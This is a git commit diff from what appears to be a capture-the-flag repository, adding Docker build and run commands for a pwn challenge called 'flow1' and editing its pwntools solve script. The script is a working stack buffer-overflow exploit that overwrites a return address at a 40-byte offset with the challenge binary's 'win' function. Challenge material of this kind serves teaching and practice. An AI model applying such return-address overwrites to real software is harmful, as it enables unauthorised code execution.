8352f17ffcc080bb34c258e49dd5b89af61a57f2
Jonathan Tay <jontay999@gmail.com>
2024-08-15 20:10:57 +0800

    made flow1 safe too

--- Pwn/flow1/service/README.md
+++ Pwn/flow1/service/README.md
@@ -1,3 +1,13 @@
 ```
 gcc -no-pie -o flow flow.c
 ```
+
+```bash
+# in the service/ directory
+docker build -t repctf-pwn-flow-1 .
+
+docker run -d -p 2001:5000 --name pwn-flow-1 --privileged repctf-pwn-flow-1
+
+# debug
+docker logs pwn-flow-1
+```
--- Pwn/flow1/solve/solve.py
+++ Pwn/flow1/solve/solve.py
@@ -2,9 +2,10 @@ from pwn import *
 from pwn import p64
 
 elf = ELF('flow')
-p = elf.process()
-# p = remote("0.0.0.0", 2001)
+# p = elf.process()
+p = remote("0.0.0.0", 2001)
 offset = 40
 payload = flat({offset: p64(elf.symbols.win)})
 p.sendline(payload)
-p.interactive()
+log.info(p.clean())
+p.close()
